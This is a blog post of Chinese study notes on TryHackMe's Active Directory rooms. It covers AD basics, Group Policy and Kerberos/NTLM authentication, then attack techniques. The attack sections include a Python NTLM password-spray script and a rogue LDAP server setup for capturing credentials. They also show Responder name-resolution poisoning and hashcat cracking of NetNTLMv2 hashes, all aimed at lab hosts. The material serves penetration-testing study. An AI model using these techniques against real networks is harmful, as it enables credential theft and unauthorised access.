@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="用thm学习域渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tryhackme-AD笔记">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/57685.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="用thm学习域渗透">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ad6b6d886c0448d14ce4ec8c62250256.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9b333a11d12f05dd4413e3f208aab363.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fcfc77d126991ffee8c927202b4dde37.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d36f5a024c20fb480cdae8cd09ddc09f.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/84504666e78373c613d3e05d176282dc.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8fbf08d03459c1b792f3b6efa4d7f285.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2eab5cacbd0d3e9dc9afb86169b711ec.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/abea24b7979676a1dcc0c568054544c8.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/03448c2faf976db890118d835000bab7.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/af95eb1a4b6c672491d8989f79c00200.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d2f78ae2b44ef76453a80144dac86b4e.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b2ab520a2601299ed9bf74d50168ca7d.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6baba3537d36d0fa78c6f61cf1386f6f.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8117a18103e98ee2ccda91fc87c63606.png">
+<meta property="og:image" content="https://guayu-kakeru.github.io/THM-AD.assets/image-20251118160159074.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/beccc46f65b8d16117d3d62f5c5dc380.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/89ef601e2332f96e45c64b3baa8d6349.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a488102fe0da47a3667961400cf298d8.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c4f288e73da9c0f4d480ad817b365fe5.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0c425c37d692c771c944e38dca8c5879.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/70e361f2a43b498e5d487d0394bd0a87.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9fb527b63773be22aa214ea2d06d1351.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/23c086c89a5bbe2fa364c95064235fb5.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d7128a0e5d344785ed570c2b8b90c775.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4874c8eb2e92a55b93c3dbbc2409e54b.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/618de3db53e103f3df56ae922f66e879.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dbbc833670f1a7ed6f76eeac7d8bd1ee.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6922d5493203f7be0024e779.png">
+<meta property="article:published_time" content="2025-11-23T10:39:33.000Z">
+<meta property="article:modified_time" content="2025-11-23T10:40:37.549Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="tryhackme">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ad6b6d886c0448d14ce4ec8c62250256.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/57685.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>tryhackme-AD笔记 | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">16</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">19</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">86</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/57685.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          tryhackme-AD笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-11-23 18:39:33 / 修改时间：18:40:37" itemprop="dateCreated datePublished" datetime="2025-11-23T18:39:33+08:00">2025-11-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/tryhackme/" itemprop="url" rel="index"><span itemprop="name">tryhackme</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/tryhackme/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+      
+      
+        <p>用thm学习域渗透</p>
+<span id="more"></span>
+<h2 id="Active-Directory-Basics"><a href="#Active-Directory-Basics" class="headerlink" title="Active Directory Basics"></a>Active Directory Basics</h2><h3 id="Windows-domain"><a href="#Windows-domain" class="headerlink" title="Windows domain:"></a>Windows domain:</h3><ul>
+<li>a <strong>Windows domain</strong> is a group of users and computers under the administration of a given business</li>
+<li>centralise the administration of common components of a Windows computer network in a single repository called <strong>Active Directory (AD)</strong></li>
+<li>The server that runs the Active Directory services is known as a <strong>Domain Controller (DC)</strong>.</li>
+</ul>
+<h3 id="AD"><a href="#AD" class="headerlink" title="AD:"></a>AD:</h3><ul>
+<li><strong>Active Directory Domain Service (AD DS)</strong>.  holds the information of all of the “objects” that exist on your network</li>
+<li>account: users, machine( a machine named <code>DC01</code> will have a machine account called <code>DC01$</code>)</li>
+<li><strong>Organizational Units</strong>: which are container objects that allow you to classify users and machines. </li>
+<li>a user can be in only one OU, but can be different groups.  Groups are Used to <strong>assign permissions</strong> to resources . OUs are Used to <strong>apply policies</strong></li>
+</ul>
+<h3 id="managing-users-in-ad"><a href="#managing-users-in-ad" class="headerlink" title="managing users in ad"></a>managing users in ad</h3><ul>
+<li>learn how to delete extra OUs and users</li>
+<li>in <code>Active Directory Users and Computers</code> choose view and <code>Adavanced Features</code>  right-click the OU and go to Properties<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ad6b6d886c0448d14ce4ec8c62250256.png"></li>
+<li>delegation : To delegate control over an OU, you can right-click it and select <strong>Delegate Control</strong>:</li>
+<li>now , if a user has the privilege to reset password. but he doesn’t really have the privileges to open <strong>Active Directory Users and Computers</strong>. in this case, he should powershell to do so.<br>(As Phillip)</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\phillip&gt; <span class="built_in">Set-ADAccountPassword</span> sophie <span class="literal">-Reset</span> <span class="literal">-NewPassword</span> (<span class="built_in">Read-Host</span> <span class="literal">-AsSecureString</span> <span class="literal">-Prompt</span> <span class="string">&#x27;New Password&#x27;</span>) <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">New Password: *********</span><br><span class="line"></span><br><span class="line">VERBOSE: Performing the operation <span class="string">&quot;Set-ADAccountPassword&quot;</span> on target <span class="string">&quot;CN=Sophie,OU=Sales,OU=THM,DC=thm,DC=local&quot;</span>.</span><br></pre></td></tr></table></figure></div>
+<p>Since we wouldn’t want Sophie to keep on using a password we know, we can also force a password reset at the next logon with the following command:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\phillip&gt; <span class="built_in">Set-ADUser</span> <span class="literal">-ChangePasswordAtLogon</span> <span class="variable">$true</span> <span class="literal">-Identity</span> sophie <span class="literal">-Verbose</span> </span><br><span class="line"></span><br><span class="line">VERBOSE: Performing the operation <span class="string">&quot;Set&quot;</span> on target <span class="string">&quot;CN=Sophie,OU=Sales,OU=THM,DC=thm,DC=local&quot;</span>.</span><br></pre></td></tr></table></figure></div>
+<h3 id="Managing-Computers-in-AD"><a href="#Managing-Computers-in-AD" class="headerlink" title="Managing Computers in AD:"></a>Managing Computers in AD:</h3><p>divided into at least the three following categories: Workstation,Servers,Domain Controllers</p>
+<h3 id="group-policies"><a href="#group-policies" class="headerlink" title="group policies"></a>group policies</h3><p>Windows manages such policies through <strong>Group Policy Objects (GPO)</strong>.  use the <strong>Group Policy Management</strong> tool (this room show a lot settings.)</p>
+<p>GPOs are distributed to the network via a network share called <code>SYSVOL</code>, which is stored in the DC. all users will sync their GOPs periodically<br>The SYSVOL share points by default to the <code>C:\Windows\SYSVOL\sysvol\</code> directory on each of the DCs in our network.<br>if want to immediately update: </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; gpupdate /force</span><br></pre></td></tr></table></figure></div>
+
+<p>for an example to <strong><em>Restrict Access to Control Panel</em></strong><br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9b333a11d12f05dd4413e3f208aab363.png"><br>create a GPO, set the setting. finnally , link to OUs<br>second: Auto Lock Screen<br><strong>Note:</strong> You might notice that if our GPO is applied to the root domain, it will also be inherited by other OUs like <code>Sales</code> or <code>Marketing</code>. Since these OUs contain users only, any Computer Configuration in our GPO will be ignored by them.<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fcfc77d126991ffee8c927202b4dde37.png"><br><strong>OUs: manage the strategy (password rules,software deployment, management permission )</strong><br><strong>groups: assgin permission(folds access, the access to softwares)</strong></p>
+<h3 id="Authentication-Methods"><a href="#Authentication-Methods" class="headerlink" title="Authentication Methods"></a>Authentication Methods</h3><p>Two protocols can be used for network authentication in windows domains:</p>
+<ul>
+<li><strong>Kerberos:</strong> Used by any recent version of Windows. This is the default protocol in any recent domain.</li>
+<li><strong>NetNTLM:</strong> Legacy authentication protocol kept for compatibility purposes.</li>
+</ul>
+<h4 id="Kerebereos"><a href="#Kerebereos" class="headerlink" title="Kerebereos"></a>Kerebereos</h4><p><strong>Key Distribution Center (KDC)</strong><br><strong>Ticket Granting Ticket (TGT)</strong> : which will allow the user to request additional tickets to access specific services.<br>Along with the TGT, a <strong>Session Key</strong> is given to the user, which they will need to generate the following requests.<br>Notice the TGT is encrypted using the <strong>krbtgt</strong> account’s password hash, and therefore the user can’t access its contents. It is essential to know that the encrypted TGT includes a copy of the Session Key as part of its contents, and the KDC has no need to store the Session Key as it can recover a copy by decrypting the TGT if needed.<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d36f5a024c20fb480cdae8cd09ddc09f.png" alt="|750"></p>
+<p><strong>Service Principal Name (SPN)</strong>: which indicates the service and server name we intend to access.<br><strong>TGS Request &amp; Response:</strong><br>To access a specific resource (defined by an <strong>SPN</strong>), the client presents their TGT to the KDC. The KDC responds with a <strong>Service Session Key</strong> for the user and a <strong>TGS ticket</strong> encrypted with the <strong>Service Owner’s Hash</strong>, which only the target service can decrypt to authenticate the user.<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/84504666e78373c613d3e05d176282dc.png" alt="|700"></p>
+<p>The TGS can then be sent to the desired service to authenticate and establish a connection. The service will use its configured account’s password hash to decrypt the TGS and validate the Service Session Key.<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8fbf08d03459c1b792f3b6efa4d7f285.png" alt="|725"></p>
+<h4 id="NetNTLM-Authentication"><a href="#NetNTLM-Authentication" class="headerlink" title="NetNTLM Authentication"></a>NetNTLM Authentication</h4><p>NetNTLM works using a challenge-response mechanism. The entire process is as follows:<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2eab5cacbd0d3e9dc9afb86169b711ec.png" alt="|825"><br><strong>Note:</strong> The described process applies when using a domain account. If a local account is used, the server can verify the response to the challenge itself without requiring interaction with the domain controller since it has the password hash stored locally on its SAM.</p>
+<h3 id="Tress-Forests-and-Trusts"><a href="#Tress-Forests-and-Trusts" class="headerlink" title="Tress,Forests and Trusts"></a>Tress,Forests and Trusts</h3><p>If you have two domains that share the same namespace (<code>thm.local</code> in our example), those domains can be joined into a <strong>Tree</strong>.<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/abea24b7979676a1dcc0c568054544c8.png" alt="|475"><br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/03448c2faf976db890118d835000bab7.png" alt="|650"><br>Trusts:<br>The simplest trust relationship that can be established is a <strong>one-way trust relationship</strong>. In a one-way trust, if <code>Domain AAA</code> trusts <code>Domain BBB</code>, this means that a user on BBB can be authorised to access resources on AAA:<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/af95eb1a4b6c672491d8989f79c00200.png" alt="|500"><br>单信任的方向和访问的方向相反</p>
+<h1 id="Compromising-AD"><a href="#Compromising-AD" class="headerlink" title="Compromising AD"></a>Compromising AD</h1><h2 id="Breaching-Active-Directory"><a href="#Breaching-Active-Directory" class="headerlink" title="Breaching Active Directory"></a>Breaching Active Directory</h2><h3 id="connect-to-domain"><a href="#connect-to-domain" class="headerlink" title="connect to domain"></a>connect to domain</h3><p>connect to the network by openvpn <code>breaching_ad_v2.ovpn</code><br>edit the <code>/etc/resolv.conf</code> appending the <code>nameserver THMDCIP</code> and <code>nameserver 1.1.1.1</code> to it.<br>use <code>nslookup thmdc.za.tryhackme.com</code> to varify.</p>
+<p>dns is key in ad enviroment. AD search the serivice by DNS’s <strong>SRV</strong> record. and in the Kerberos granting tickets , <strong>SPN</strong> is binded to nameserver , not IPs.</p>
+<h3 id="OSINT-and-Phishing"><a href="#OSINT-and-Phishing" class="headerlink" title="OSINT and Phishing"></a>OSINT and Phishing</h3><ul>
+<li>Users who ask questions on public forums but disclose sensitive information</li>
+<li>Developers that upload scripts to services such as <a target="_blank" rel="noopener" href="https://github.com/">Github</a> with credentials hardcoded.</li>
+<li>Credentials being disclosed in past breaches since employees used their work accounts to sign up for other external websites.</li>
+<li>Phishing : will install a Remote Access Trojan (RAT) in the background.</li>
+</ul>
+<h3 id="NTLM-Authenticated-Services"><a href="#NTLM-Authenticated-Services" class="headerlink" title="NTLM Authenticated Services"></a>NTLM Authenticated Services</h3><p>brute force attack. we prefer using password sparaying (use a password to different accounts.) instead of full brute-force.<br>we can use some scripts like hydra to help us to brute . but it’s better to use script up these types of attacks yourself,<br>example </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">password_spray</span>(<span class="params">self, password, url</span>):</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;[*] Starting passwords spray attack using the following password: &quot;</span> + password)</span><br><span class="line">    <span class="comment">#Reset valid credential counter</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="comment">#Iterate through all of the possible usernames</span></span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> <span class="variable language_">self</span>.users:</span><br><span class="line">        <span class="comment">#Make a request to the website and attempt Windows Authentication</span></span><br><span class="line">        response = requests.get(url, auth=HttpNtlmAuth(<span class="variable language_">self</span>.fqdn + <span class="string">&quot;\\&quot;</span> + user, password))</span><br><span class="line">        <span class="comment">#Read status code of response to determine if authentication was successful</span></span><br><span class="line">        <span class="keyword">if</span> (response.status_code == <span class="variable language_">self</span>.HTTP_AUTH_SUCCEED_CODE):</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[+] Valid credential pair found! Username: &quot;</span> + user + <span class="string">&quot; Password: &quot;</span> + password)</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">self</span>.verbose):</span><br><span class="line">            <span class="keyword">if</span> (response.status_code == <span class="variable language_">self</span>.HTTP_AUTH_FAILED_CODE):</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;[-] Failed login with Username: &quot;</span> + user)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;[*] Password spray attack completed, &quot;</span> + <span class="built_in">str</span>(count) + <span class="string">&quot; valid credential pairs found&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlm_passwordspray<span class="selector-class">.py</span> -u usernames<span class="selector-class">.txt</span> -f za<span class="selector-class">.tryhackme</span><span class="selector-class">.com</span> -<span class="selector-tag">p</span> Changeme123 -<span class="selector-tag">a</span> http:<span class="comment">//ntlmauth.za.tryhackme.com/</span></span><br></pre></td></tr></table></figure></div>
+<h3 id="LDAP-Bind-Credentials"><a href="#LDAP-Bind-Credentials" class="headerlink" title="LDAP Bind Credentials"></a>LDAP Bind Credentials</h3><p>Another method of AD authentication that applications can use is <strong>Lightweight Directory Access Protocol (LDAP)</strong> authentication<br>The application has a pair of AD credentials that it can use first to query LDAP and then verify the AD user’s credentials.</p>
+<ul>
+<li>Gitlab</li>
+<li>Jenkins</li>
+<li>Custom-developed web applications</li>
+<li>Printers</li>
+<li>VPNs<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d2f78ae2b44ef76453a80144dac86b4e.png"><br>if get a foothold,  reading the configuration files to recover these AD credentials.<br>default port of LDAP is 389</li>
+</ul>
+<h4 id="LDAP-Pass-back-attack"><a href="#LDAP-Pass-back-attack" class="headerlink" title="LDAP Pass-back attack"></a>LDAP Pass-back attack</h4><p>In an LDAP Pass-back attack, an attacker modifies a device’s configuration to point to a rogue LDAP server, then triggers an authentication test to intercept and capture the device’s credentials.</p>
+<p><code>nc -lvp 389</code> for some security reson in LDAP server, the credentials will not be transmitted in cleartext.<br> We will need to create a rogue LDAP server and configure it insecurely to ensure the credentials are sent in plaintext.<br>install: <code>sudo apt-get update &amp;&amp; sudo apt-get -y install slapd ldap-utils &amp;&amp; sudo systemctl enable slapd</code><br><code>sudo dpkg-reconfigure -p low slapd</code><br>We want to ensure that our LDAP server only supports PLAIN and LOGIN authentication methods</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#olcSaslSecProps.ldif dn: cn=config replace: olcSaslSecProps olcSaslSecProps: noanonymous,minssf=0,passcred</span></span><br></pre></td></tr></table></figure></div>
+<p><code>sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif &amp;&amp; sudo service slapd restart</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LDIF"><figure class="iseeu highlight /ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[thm@thm]$ ldapsearch -H ldap:// -x -LLL -s base -b &quot;&quot; supportedSASLMechanisms </span><br><span class="line"><span class="attribute">dn</span>: supportedSASLMechanisms: PLAIN </span><br><span class="line"><span class="attribute">supportedSASLMechanisms</span>: LOGIN</span><br></pre></td></tr></table></figure></div>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b2ab520a2601299ed9bf74d50168ca7d.png"><br><code>tcpdump -SX -i breachad tcp port 389</code></p>
+<h3 id="Authentication-Relays"><a href="#Authentication-Relays" class="headerlink" title="Authentication Relays"></a>Authentication Relays</h3><p><strong>Server Message Block(SMB)</strong> allows clients (like workstations) to communicate with a server (like a file share).</p>
+<h4 id="LLMNR-NBT-NS-and-WPAD"><a href="#LLMNR-NBT-NS-and-WPAD" class="headerlink" title="LLMNR, NBT-NS, and WPAD"></a>LLMNR, NBT-NS, and WPAD</h4><p>On a real LAN, Responder will attempt to poison any  Link-Local Multicast Name Resolution (LLMNR)<strong>(链路本地多播名称解析)</strong>:,  NetBIOS Name Service (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests that are detected.</p>
+<p>Responder captures NetNTLM authentication hashes by poisoning local name resolution requests (like LLMNR and NBT-NS), <strong>tricking clients into connecting to a malicious server</strong> instead of the intended host.</p>
+<p>Responder’s use is limited to the local network and can be disruptive and detectable, as its method of poisoning connections <strong>causes legitimate user authentications to fail.</strong><br><code>sudo responder -I breachad</code> breachad 是网卡名称<br><code>hashcat -m 5600 &lt;hash file&gt; &lt;password file&gt; --force</code><br>We use hashtype 5600, which corresponds with NTLMv2-SSP for hashcat</p>
